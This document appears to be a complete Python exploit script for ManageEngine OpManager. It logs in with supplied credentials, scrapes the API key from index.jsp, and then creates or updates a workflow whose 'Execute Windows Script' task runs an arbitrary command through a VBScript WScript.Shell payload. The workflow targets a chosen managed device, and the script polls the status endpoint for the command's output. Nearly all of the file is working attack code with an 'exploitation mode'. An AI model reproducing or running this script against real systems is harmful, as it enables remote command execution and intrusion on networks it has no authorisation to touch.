#!/usr/bin/env python3
import argparse
import json
import re
import sys
import time
import urllib.parse

import requests


# ----- Simple color helpers -----
class Color:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    BOLD = "\033[1m"


def c(text, color):
    return f"{color}{text}{Color.RESET}"


# ----- Logging helpers (respect --debug) -----
DEBUG = False


def log_debug(msg):
    if DEBUG:
        print(c(msg, Color.CYAN))


def log_info(msg):
    print(c(msg, Color.BLUE))


def log_good(msg):
    print(c(msg, Color.GREEN))


def log_warn(msg):
    print(c(msg, Color.YELLOW))


def log_error(msg):
    print(c(msg, Color.RED))


# ----- Argument parsing -----
def parse_args():
    parser = argparse.ArgumentParser(
        description="OpManager workflow RCE via API key + workflow update/execute"
    )
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        help="Target base URL (e.g. http://ms01 or http://ms01.corp.local)",
    )
    parser.add_argument(
        "-u",
        "--user",
        required=True,
        help="Username for login (e.g. admin)",
    )
    parser.add_argument(
        "-p",
        "--password",
        required=True,
        help="Password for login",
    )
    parser.add_argument(
        "-c",
        "--command",
        help='Command to run on target (e.g. "whoami /all")',
    )
    parser.add_argument(
        "-wf",
        "--workflow-name",
        help='Workflow name to use (e.g. "testrce"). '
             "If it already exists, it will be reused; otherwise a new workflow will be created.",
    )
    parser.add_argument(
        "-d",
        "--device",
        help='Device displayName to target (e.g. "Ms01"). '
             "If omitted and not listing devices, the script will list devices and exit.",
    )
    parser.add_argument(
        "--poll-interval",
        type=float,
        default=2.0,
        help="Seconds between getWorkflowExecutionStatus polls (default: 2.0)",
    )
    parser.add_argument(
        "--poll-timeout",
        type=float,
        default=120.0,
        help="Maximum seconds to wait for workflow completion (default: 120)",
    )
    parser.add_argument(
        "--filter-id",
        default="1",
        help="Filter ID for getDeviceListForFilter (default: 1)",
    )
    parser.add_argument(
        "--list-workflows",
        action="store_true",
        help="List workflows and exit (no exploitation).",
    )
    parser.add_argument(
        "--list-devices",
        action="store_true",
        help="List devices and exit (no exploitation).",
    )
    parser.add_argument(
        "--no-exec",
        action="store_true",
        help="Do not execute the workflow after updating it.",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Enable verbose debug logging.",
    )
    return parser.parse_args()


def build_base_url(target: str) -> str:
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target
    return target.rstrip("/")


# ----- Auth flow -----
def full_login(session: requests.Session, base_url: str, username: str, password: str):
    root_url = f"{base_url}/"
    log_info("[*] Logging in...")
    log_debug("[*] Step 1: GET / to obtain initial JSESSIONID...")
    r = session.get(root_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False)
    log_debug(f"[+] GET / HTTP {r.status_code}")
    log_debug(f"[*] Cookies after GET /: {session.cookies.get_dict()}")
    if "JSESSIONID" not in session.cookies:
        log_warn("[!] No JSESSIONID cookie set after GET /. Login may fail later.")
    jsessionid = session.cookies.get("JSESSIONID")

    login1_url = f"{base_url}/servlets/SettingsServlet"
    login1_params = {
        "requestType": "AJAX",
        "sid": "0.5495852722712017",
    }
    login1_data = {
        "EncryptPassword": password,
        "userName": username,
        "domainName": "Authenticator",
        "autoSignIn": "true",
        "authRuleName": "Authenticator",
    }
    login1_headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": base_url,
        "Referer": f"{base_url}/",
    }

    log_debug("[*] Step 2: POST /servlets/SettingsServlet (pre-login AJAX)...")
    r = session.post(
        login1_url,
        params=login1_params,
        data=login1_data,
        headers=login1_headers,
        verify=False,
    )
    log_debug(f"[+] SettingsServlet HTTP {r.status_code}")
    log_debug(f"[*] Cookies after SettingsServlet: {session.cookies.get_dict()}")

    jsessionid = session.cookies.get("JSESSIONID", jsessionid)
    if not jsessionid:
        log_warn("[!] Still no JSESSIONID; j_security_check may not bind properly.")
    jsec_path = "/j_security_check"
    if jsessionid:
        jsec_path += f";jsessionid={jsessionid}"

    jsec_url = f"{base_url}{jsec_path}"
    jsec_data = {
        "AUTHRULE_NAME": "Authenticator",
        "clienttype": "html",
        "ScreenWidth": "1919",
        "ScreenHeight": "788",
        "loginFromCookieData": "false",
        "ntlmv2": "false",
        "j_username": username,
        "j_password": password,
        "signInAutomatically": "on",
        "uname": "",
    }
    jsec_headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": base_url,
        "Referer": f"{base_url}/",
        "Upgrade-Insecure-Requests": "1",
    }

    log_debug("[*] Step 3: POST j_security_check with credentials...")
    r = session.post(jsec_url, data=jsec_data, headers=jsec_headers, verify=False)
    log_debug(f"[+] j_security_check HTTP {r.status_code}")
    log_debug(f"[*] Cookies after j_security_check: {session.cookies.get_dict()}")

    log_debug("[*] Step 4: GET / again to finalize session...")
    r = session.get(root_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False)
    log_debug(f"[+] Second GET / HTTP {r.status_code}")
    log_debug(f"[*] Cookies after second GET /: {session.cookies.get_dict()}")

    if "JSESSIONID" not in session.cookies:
        log_warn("[!] Warning: No JSESSIONID after login flow. Auth may have failed.")
    else:
        log_good(f"[+] Full login flow completed with JSESSIONID: {session.cookies['JSESSIONID']}")


def extract_api_key(session: requests.Session, base_url: str) -> str:
    url = f"{base_url}/apiclient/ember/index.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": f"{base_url}/",
    }

    log_info("[*] Fetching /apiclient/ember/index.jsp to extract apiKey...")
    r = session.get(url, headers=headers, verify=False)
    log_debug(f"[+] GET {url} HTTP {r.status_code}")
    log_debug(f"[*] Cookies after GET index.jsp: {session.cookies.get_dict()}")

    if r.status_code != 200:
        log_error("[!] index.jsp returned non-200; cannot extract apiKey.")
        log_debug(r.text[:500])
        sys.exit(1)

    m = re.search(r'window\.OPM\.apiKey\s*=\s*"([0-9a-fA-F]+)"', r.text)
    if not m:
        log_error("[!] Could not find window.OPM.apiKey in index.jsp response.")
        sys.exit(1)

    api_key = m.group(1)
    log_good(f"[+] Extracted apiKey: {api_key}")
    return api_key


# ----- Workflows -----
def get_workflow_list(session: requests.Session, base_url: str, api_key: str):
    url = f"{base_url}/api/json/workflow/getWorkflowList"
    params = {
        "apiKey": api_key,
        "_": "1770535495554",
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": f"{base_url}/apiclient/ember/index.jsp",
        "OPMCurrentRoute": urllib.parse.quote_plus(
            f"{base_url}/apiclient/ember/index.jsp#/Workflows/ExecutionLogs"
        ),
    }

    log_info("[*] Getting workflow list...")
    r = session.get(url, params=params, headers=headers, verify=False)
    log_debug(f"[+] getWorkflowList HTTP {r.status_code}")
    if r.status_code != 200:
        log_error(r.text[:500])
        sys.exit(1)

    try:
        data = r.json()
    except Exception:
        log_error("[!] Failed to parse workflow list JSON")
        log_debug(r.text[:500])
        sys.exit(1)

    return data


def find_workflow_by_name(workflow_list_json, name: str):
    workflows = []

    if isinstance(workflow_list_json, dict):
        if "workflows" in workflow_list_json:
            workflows = workflow_list_json["workflows"]
        elif "data" in workflow_list_json:
            workflows = workflow_list_json["data"]
        else:
            workflows = [
                v for v in workflow_list_json.values()
                if isinstance(v, dict) and ("wfName" in v or "name" in v)
            ]
    elif isinstance(workflow_list_json, list):
        workflows = workflow_list_json
    else:
        workflows = []

    for wf in workflows:
        if not isinstance(wf, dict):
            continue

        wf_name = wf.get("wfName") or wf.get("name")

        wf_id = (
            wf.get("wfID")
            or wf.get("id")
            or wf.get("wfId")
            or wf.get("workflowID")
            or wf.get("workflowId")
            or wf.get("rbID")
            or wf.get("rbId")
        )

        if wf_name and wf_name.lower() == name.lower():
            if wf_id is None:
                log_warn("[!] Matched workflow name but no ID field found.")
                log_debug("[*] Raw workflow object:")
                log_debug(json.dumps(wf, indent=2))
            return (str(wf_id) if wf_id is not None else None, wf_name)

    return None, None


# ----- Devices -----
def get_device_list_for_filter(
    session: requests.Session,
    base_url: str,
    api_key: str,
    filter_id: str,
):
    url = f"{base_url}/api/json/device/getDeviceListForFilter"
    params = {
        "apiKey": api_key,
        "filterID": filter_id,
        "type": "workflow",
        "_": "1770536100781",
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": f"{base_url}/apiclient/ember/index.jsp",
    }

    log_info("[*] Getting device list for filter...")
    r = session.get(url, params=params, headers=headers, verify=False)
    log_debug(f"[+] getDeviceListForFilter HTTP {r.status_code}")
    if r.status_code != 200:
        log_error(r.text[:500])
        sys.exit(1)

    try:
        data = r.json()
    except Exception:
        log_error("[!] Failed to parse device list JSON")
        log_debug(r.text[:500])
        sys.exit(1)

    return data


def choose_device(device_list_json, desired_display_name: str):
    remaining = device_list_json.get("remainingDevices") or []
    selected = device_list_json.get("selectedDevices") or []
    all_devices = list(remaining) + list(selected)

    for dev in all_devices:
        dn = dev.get("displayName") or dev.get("name")
        if dn and dn.lower() == desired_display_name.lower():
            return dev

    return None


def print_device_list(device_list_json):
    print(json.dumps(device_list_json, indent=2))


def print_device_list_and_exit(device_list_json):
    log_warn("[!] No -d / --device argument provided.")
    log_info("[*] These devices can be targeted (raw JSON):")
    print_device_list(device_list_json)
    log_info("\n[*] Re-run the script with -d <displayName> (e.g. -d Ms01)")
    sys.exit(0)


# ----- VBS payload builder -----
def build_cmd_vbs(command: str) -> str:
    escaped_cmd = command.replace('"', '""')

    vbs = f"""Option Explicit
On Error Resume Next

Dim shell, execObj, result, cmd

cmd = "cmd /c " & "{escaped_cmd}"

Set shell = CreateObject("WScript.Shell")
Set execObj = shell.Exec(cmd)

result = ""
Do Until execObj.StdOut.AtEndOfStream
    result = result & execObj.StdOut.ReadAll()
Loop

WScript.Echo result
"""
    return vbs


def build_json_data(workflow_id: str, workflow_name: str, command: str, device_name: str):
    script_body = build_cmd_vbs(command)

    main_task = {
        "associationID": workflow_id,
        "scriptBody": script_body,
        "isCheck": "false",
        "taskID": "9",
        "name": "Execute Windows Script",
        "iconName": "execute_script.swf",
        "workingDir": "${UserHomeDir}",
        "dialogId": "3",
        "executeFrom": "false",
        "timeout": "60",
        "y": 147,
        "cmdLine": "cscript /Nologo ${FileName}.vbs ${DeviceName} ${UserName} ${Password} arg1",
        "x": 65,
        "taskid": "9",
        "deviceDisplayName": "${DeviceName}",
    }

    workflow_details = {
        "wfID": workflow_id,
        "wfName": workflow_name,
        "wfDescription": "Description not given for this Workflow",
        "triggerType": "1",
    }

    json_obj = {
        "taskProps": {
            "mainTask": main_task,
            "name": workflow_name,
            "description": "",
        },
        "triggerProps": {
            "workflowDetails": workflow_details,
            "selectedDevices": [device_name],
            "scheduleDetails": {},
            "criteriaDetails": {
                "noofpolls": "1",
                "selectAllRules": "no",
                "chkNFAAlarm": "no",
                "chkConfigBackupFailed": "no",
                "chkConfigChangeDown": "no",
                "devicemissespolls": "no",
                "hardwareMonitorCheck": "no",
                "ucsFaultCheck": "no",
                "chkStorageAlarm": "no",
                "printerCheck": {"selected": "no"},
                "ipslaCheck": {"selected": "all"},
                "upsCheck": {"selected": "no"},
                "interfaceAndPorts": {"selected": "no"},
                "serviceCheck": {"selected": "no"},
                "NTserviceCheck": {"selected": "no"},
                "mssqlServiceCheck": {"selected": "no"},
                "adServiceCheck": {"selected": "no"},
                "exchangeServiceCheck": {"selected": "no"},
                "exchangeMonitorCheck": {"selected": "no"},
                "adMonitorCheck": {"selected": "no"},
                "mssqlMonitorCheck": {"selected": "no"},
                "trapsCheck": {"selected": "no"},
                "thresholdCheck": {"selected": "no"},
                "urlCheck": {"selected": "no"},
                "ScriptMonitorCheck": {"selected": "no"},
                "processMonitorCheck": {"selected": "no"},
                "FileMonitorCheck": {"selected": "no"},
                "FolderMonitorCheck": {"selected": "no"},
                "eventLogCheck": {"selected": "no"},
                "agentDownCheck": "yes",
                "sysLogCheck": {"selected": "no"},
                "VirtualDeviceMonitorCheck": {
                    "selected": "no",
                    "supportedVirtualDeviceMonitors": [],
                },
                "clearalarm": "no",
                "notifySeverity": ["1"],
                "timeWindow": {
                    "twoption": "All",
                    "startTime": "",
                    "endTime": "",
                    "selectAllDaysChkBox": "no",
                    "daysSelected": [],
                },
                "trigger": {
                    "delayAck": "off",
                    "triggerAck": "off",
                },
            },
        },
    }

    json_str = json.dumps(json_obj, separators=(",", ":"))
    return "jsonData=" + urllib.parse.quote_plus(json_str)


# ----- addWorkflow and updateWorkflow -----
def add_workflow(
    session: requests.Session,
    base_url: str,
    api_key: str,
    workflow_name: str,
    command: str,
    device_name: str,
):
    """
    Create a new workflow via /api/json/workflow/addWorkflow using a jsonData
    structure similar to what was captured in Burp.
    """
    script_body = build_cmd_vbs(command)

    json_obj = {
        "taskProps": {
            "mainTask": {
                "taskID": 9,
                "dialogId": 3,
                "name": "Execute Windows Script",
                "deviceDisplayName": "${DeviceName}",
                "cmdLine": "cscript //Nologo ${FileName}.vbs ${DeviceName} ${UserName} ${Password} arg1",
                "scriptBody": script_body,
                "workingDir": "${UserHomeDir}",
                "timeout": "60",
                "associationID": -1,
                "x": 52,
                "y": 136,
            },
            "name": "Untitled",
            "description": "",
        },
        "triggerProps": {
            "workflowDetails": {
                "wfID": "",
                "wfName": workflow_name,
                "wfDescription": "Description not given for this Workflow",
                "triggerType": "1",
            },
            "selectedDevices": [device_name],
            "scheduleDetails": {},
            "criteriaDetails": {
                "noofpolls": "1",
                "selectAllRules": "no",
                "chkNFAAlarm": "no",
                "chkConfigBackupFailed": "no",
                "chkConfigChangeDown": "no",
                "devicemissespolls": "yes",
                "hardwareMonitorCheck": "no",
                "ucsFaultCheck": "no",
                "chkStorageAlarm": "no",
                "printerCheck": {"selected": "no"},
                "ipslaCheck": {"selected": "all"},
                "upsCheck": {"selected": "no"},
                "interfaceAndPorts": {"selected": "no"},
                "serviceCheck": {"selected": "no"},
                "NTserviceCheck": {"selected": "no"},
                "mssqlServiceCheck": {"selected": "no"},
                "adServiceCheck": {"selected": "no"},
                "exchangeServiceCheck": {"selected": "no"},
                "exchangeMonitorCheck": {"selected": "no"},
                "adMonitorCheck": {"selected": "no"},
                "mssqlMonitorCheck": {"selected": "no"},
                "trapsCheck": {"selected": "no"},
                "thresholdCheck": {"selected": "no"},
                "urlCheck": {"selected": "no"},
                "ScriptMonitorCheck": {"selected": "no"},
                "processMonitorCheck": {"selected": "no"},
                "FileMonitorCheck": {"selected": "no"},
                "FolderMonitorCheck": {"selected": "no"},
                "eventLogCheck": {"selected": "no"},
                "agentDownCheck": "no",
                "sysLogCheck": {"selected": "no"},
                "VirtualDeviceMonitorCheck": {
                    "selected": "no",
                    "supportedVirtualDeviceMonitors": [],
                },
                "clearalarm": "no",
                "notifySeverity": ["1", "2", "3"],
                "timeWindow": {
                    "twoption": "All",
                    "startTime": "",
                    "endTime": "",
                    "selectAllDaysChkBox": "no",
                    "daysSelected": [],
                },
                "trigger": {
                    "delayAck": "off",
                    "triggerAck": "off",
                },
            },
        },
    }

    json_str = json.dumps(json_obj, separators=(",", ":"))
    data = "jsonData=" + urllib.parse.quote_plus(json_str)

    url = f"{base_url}/api/json/workflow/addWorkflow"
    params = {"apiKey": api_key}
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": base_url,
        "Referer": f"{base_url}/apiclient/ember/index.jsp",
        # OPMCurrentRoute here is not strictly required for backend behavior
    }

    log_info(f"[*] Creating new workflow '{workflow_name}'...")
    r = session.post(
        url,
        params=params,
        data=data,
        headers=headers,
        verify=False,
    )
    log_debug(f"[+] addWorkflow HTTP {r.status_code}")
    if r.status_code != 200:
        log_error("[!] addWorkflow failed")
        log_debug(r.text[:500])
        sys.exit(1)
    log_good("[+] addWorkflow completed (check workflow list for new entry).")


def update_workflow(
    session: requests.Session,
    base_url: str,
    api_key: str,
    workflow_id: str,
    workflow_name: str,
    json_data_str: str,
    device_name: str,
):
    url = f"{base_url}/api/json/workflow/updateWorkflow"
    params = {
        "apiKey": api_key,
        "wfID": workflow_id,
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": base_url,
        "Referer": f"{base_url}/apiclient/ember/index.jsp",
        "OPMCurrentRoute": urllib.parse.quote_plus(
            f"{base_url}/apiclient/ember/index.jsp#/Workflows/InfoTabs/{workflow_name}/{workflow_id}/Global_wf"
        ),
    }

    log_info(f"[*] Updating workflow {workflow_id} ({workflow_name}) for device {device_name}...")
    r = session.post(
        url,
        params=params,
        data=json_data_str,
        headers=headers,
        verify=False,
    )
    log_debug(f"[+] updateWorkflow HTTP {r.status_code}")
    if r.status_code != 200:
        log_error(r.text[:500])
    else:
        log_good("[+] Workflow updated successfully.")


# ----- executeWorkflow and status -----
def execute_workflow(
    session: requests.Session,
    base_url: str,
    api_key: str,
    workflow_id: str,
    device_moid: str,
) -> str:
    url = f"{base_url}/api/json/workflow/executeWorkflow"
    params = {
        "apiKey": api_key,
    }
    data = {
        "wfID": workflow_id,
        "deviceName": device_moid,
        "triggerType": "1",
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": base_url,
        "Referer": f"{base_url}/apiclient/ember/index.jsp",
    }

    log_info("[*] Executing workflow...")
    r = session.post(
        url,
        params=params,
        data=data,
        headers=headers,
        verify=False,
    )
    log_debug(f"[+] executeWorkflow HTTP {r.status_code}")
    body = r.text.strip()
    log_debug("[*] Raw executeWorkflow response (truncated):")
    log_debug(body[:500])

    exec_id = None

    try:
        j = r.json()
        if isinstance(j, dict):
            exec_id = j.get("executionID") or j.get("executionId") or j.get("id")
        elif isinstance(j, list) and j:
            exec_id = j[0]
    except Exception:
        pass

    if not exec_id:
        m = re.search(r'(\d+)', body)
        if m:
            exec_id = m.group(1)

    if not exec_id:
        log_error("[!] Could not extract executionID. Inspect the above response and adjust parsing.")
        sys.exit(1)

    exec_id = str(exec_id)
    log_good(f"[+] Got executionID: {exec_id}")
    return exec_id


def get_workflow_execution_status(
    session: requests.Session,
    base_url: str,
    api_key: str,
    execution_id: str,
):
    url = f"{base_url}/api/json/workflow/getWorkflowExecutionStatus"
    params = {
        "apiKey": api_key,
        "executionID": execution_id,
        "_": "1770535495551",
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": f"{base_url}/apiclient/ember/index.jsp",
    }

    r = session.get(url, params=params, headers=headers, verify=False)
    return r


def extract_output_from_status_json(j: dict | list, execution_id: str) -> str | None:
    if isinstance(j, list):
        if not j:
            return None
        j = j[0]

    if not isinstance(j, dict):
        return None

    exlogs = j.get("exectionlogs")
    if not isinstance(exlogs, dict):
        return None

    logs_for_exec = exlogs.get(str(execution_id))
    if not isinstance(logs_for_exec, dict):
        logs_for_exec = exlogs.get(int(execution_id)) if execution_id.isdigit() else None
        if not isinstance(logs_for_exec, dict):
            return None

    logdata = logs_for_exec.get("logData")
    if not isinstance(logdata, list):
        return None

    for entry in logdata:
        msg = entry.get("logMessage")
        if not isinstance(msg, str):
            continue
        if "Script output:" in msg:
            out = msg.split("Script output:", 1)[1]
            return out.strip()

    all_msgs = []
    for entry in logdata:
        msg = entry.get("logMessage")
        if isinstance(msg, str):
            all_msgs.append(msg)
    if all_msgs:
        return "\n".join(all_msgs).strip()

    return None


# ----- Main -----
def main():
    global DEBUG
    args = parse_args()
    DEBUG = args.debug

    base_url = build_base_url(args.target)

    log_info(f"[*] Target:  {base_url}")
    log_info(f"[*] User:    {args.user}")

    listing_mode = args.list_workflows or args.list_devices
    exploit_mode = not listing_mode

    if exploit_mode:
        if not args.command or not args.workflow_name:
            log_error("[!] Exploitation mode requires -c/--command and -wf/--workflow-name.")
            sys.exit(1)
        log_info(f"[*] Workflow: {args.workflow_name}")
        log_info(f"[*] Command:  {args.command}")
    else:
        if args.list_workflows:
            log_info("[*] Mode: List workflows")
        if args.list_devices:
            log_info("[*] Mode: List devices")

    requests.packages.urllib3.disable_warnings()  # type: ignore

    with requests.Session() as session:
        full_login(session, base_url, args.user, args.password)
        api_key = extract_api_key(session, base_url)

        device_list = get_device_list_for_filter(
            session, base_url, api_key, args.filter_id
        )

        if args.list_devices and not exploit_mode:
            print_device_list(device_list)
            sys.exit(0)

        if exploit_mode:
            if not args.device:
                print_device_list_and_exit(device_list)

            dev = choose_device(device_list, args.device)
            if not dev:
                log_error(f"[!] Device with displayName '{args.device}' not found.")
                log_info("[*] Available devices (raw JSON):")
                print_device_list(device_list)
                sys.exit(1)

            device_name = dev.get("name")
            device_moid = dev.get("moid")
            log_good(
                f"[+] Using device: displayName='{dev.get('displayName')}', "
                f"name='{device_name}', moid='{device_moid}'"
            )
        else:
            device_name = device_moid = None

        wf_list = get_workflow_list(session, base_url, api_key)

        if args.list_workflows and not exploit_mode:
            print(json.dumps(wf_list, indent=2))
            sys.exit(0)

        # Exploit path: find or create workflow
        wf_id, wf_name = find_workflow_by_name(wf_list, args.workflow_name)

        if wf_id:
            log_good(f"[+] Found existing workflow '{wf_name}' with ID {wf_id}")
        else:
            log_warn(f"[!] Workflow '{args.workflow_name}' not found in list, creating it...")
            add_workflow(
                session,
                base_url,
                api_key,
                workflow_name=args.workflow_name,
                command=args.command,
                device_name=device_name,
            )

            # Refresh list and resolve actual ID
            wf_list = get_workflow_list(session, base_url, api_key)
            wf_id, wf_name = find_workflow_by_name(wf_list, args.workflow_name)
            if not wf_id:
                log_error("[!] Failed to find newly created workflow in list; aborting.")
                if DEBUG:
                    log_debug("[*] Full workflow list after creation attempt:")
                    log_debug(json.dumps(wf_list, indent=2))
                sys.exit(1)

            log_good(f"[+] Created new workflow '{wf_name}' with ID {wf_id}")

        # Now wf_id is a real ID; update it with our current command
        json_data_str = build_json_data(
            workflow_id=wf_id,
            workflow_name=wf_name,
            command=args.command,
            device_name=device_name,
        )

        update_workflow(
            session,
            base_url,
            api_key,
            workflow_id=wf_id,
            workflow_name=wf_name,
            json_data_str=json_data_str,
            device_name=device_name,
        )

        if args.no_exec:
            log_warn("[*] --no-exec specified; skipping workflow execution.")
            sys.exit(0)

        execution_id = execute_workflow(
            session,
            base_url,
            api_key,
            workflow_id=wf_id,
            device_moid=device_moid,
        )

        log_info("[*] Polling for workflow execution status...")
        start = time.time()
        output_printed = False
        while True:
            if time.time() - start > args.poll_timeout:
                log_error("[!] Timeout while waiting for workflow completion")
                break

            r = get_workflow_execution_status(
                session,
                base_url,
                api_key,
                execution_id=execution_id,
            )
            if r.status_code != 200:
                log_error(f"[!] getWorkflowExecutionStatus HTTP {r.status_code}")
                log_debug(r.text[:500])
                time.sleep(args.poll_interval)
                continue

            try:
                j = r.json()
            except Exception:
                log_error("[!] Failed to parse status JSON")
                log_debug(r.text[:500])
                time.sleep(args.poll_interval)
                continue

            # Handle error wrapper: {"error":{"message":"...","code":5013}}
            if isinstance(j, dict) and "error" in j:
                err = j["error"]
                msg = err.get("message", "")
                code = err.get("code", "")
                log_error(f"[!] getWorkflowExecutionStatus error code={code}, message={msg}")
                log_error("[!] Treating this as execution failure (no output).")
                if DEBUG:
                    log_debug("[*] Raw error JSON:")
                    log_debug(json.dumps(j, indent=2))
                sys.exit(1)

            status = ""
            if isinstance(j, list) and j:
                first = j[0]
                if isinstance(first, dict):
                    status = first.get("status") or ""
            elif isinstance(j, dict):
                status = j.get("status") or ""

            log_info(f"[*] Status: {status!r}")

            out = extract_output_from_status_json(j, execution_id)
            if out and not output_printed:
                print(c("\n===== Command Output =====", Color.BOLD))
                print(out)
                print(c("==========================\n", Color.BOLD))
                output_printed = True

            if isinstance(status, str) and status.upper() in ("COMPLETED", "FAILED", "SUCCESS"):
                if not output_printed:
                    log_error("[!] Workflow reached terminal state but no script output was found.")
                    log_error("[!] This indicates the command likely did NOT execute as expected.")
                    if DEBUG:
                        log_debug("[*] Full status JSON for debugging:")
                        log_debug(json.dumps(j, indent=2))
                    sys.exit(1)
                break

            time.sleep(args.poll_interval)


if __name__ == "__main__":
    main()
